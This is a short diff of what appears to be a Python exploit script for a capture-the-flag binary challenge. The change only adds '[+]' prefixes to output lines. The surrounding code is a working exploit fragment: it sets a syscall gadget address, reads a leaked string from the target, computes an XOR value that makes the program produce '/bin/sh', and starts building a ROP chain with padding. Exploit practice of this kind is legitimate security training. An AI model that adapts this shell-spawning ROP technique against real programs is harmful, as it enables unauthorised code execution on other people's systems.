@@ -11,11 +11,11 @@ syscall			= p64(0x401229)
 random_str		= p64(0x404090)
 
 string = r.recvuntil(b"\n").split(b" ")[-1].strip()
-print(f"Leaked string: {string}")
+print(f"[+] Leaked string: {string}")
 
 # [::-1] because the string will be xored in little endian in the program
 xor_val = int(binascii.hexlify((string + b"\x00")[::-1]), 16) ^ int(binascii.hexlify(b"/bin/sh\x00"[::-1]), 16)
-print(f"XOR value to have \"/bin/sh\": {hex(xor_val)}")
+print(f"[+] XOR value to have \"/bin/sh\": {hex(xor_val)}")
 
 rop = b"yes"
 rop += b"A" * 14
